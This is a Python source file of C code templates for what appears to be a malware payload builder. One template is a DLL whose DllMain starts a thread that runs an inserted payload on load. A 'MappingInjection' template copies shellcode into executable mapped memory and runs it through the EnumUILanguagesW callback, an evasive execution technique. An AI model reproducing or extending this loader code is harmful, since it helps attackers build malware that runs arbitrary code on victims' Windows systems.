class Templates:

    class Main:

        DLL_MAIN = r'''
#include <stdio.h>
#include <stdlib.h>
#include<Windows.h>

**PRAGMA_COMMENTS**


**PAYLOAD**

void Main() {

**MAIN_FUNC**

}

BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
    )
    {
    
        HANDLE threadHandle;

        switch (ul_reason_for_call)
        {
            case DLL_PROCESS_ATTACH:
       
                threadHandle = CreateThread(NULL, 0, Main, NULL, 0, NULL);
                CloseHandle(threadHandle);

            case DLL_THREAD_ATTACH:
                break;
            case DLL_THREAD_DETACH:
                break;
            case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
    }

'''

    class Injections:

        class StandardInjection:

            payload = ''

        class MappingInjection:

            payload = r'''
            
        DWORD Size = sizeof(PAY);


        HANDLE hFile = CreateFileMappingW(INVALID_HANDLE_VALUE , NULL , PAGE_EXECUTE_READWRITE, NULL , Size , NULL);

        PVOID addr = MapViewOfFile(hFile , FILE_MAP_WRITE | FILE_MAP_EXECUTE , NULL , NULL , Size);

        memcpy(addr , PAY , Size);


        EnumUILanguagesW((UILANGUAGE_ENUMPROC)addr , MUI_LANGUAGE_NAME , NULL);'''



    class Fetching:

        class Internet:

            pass
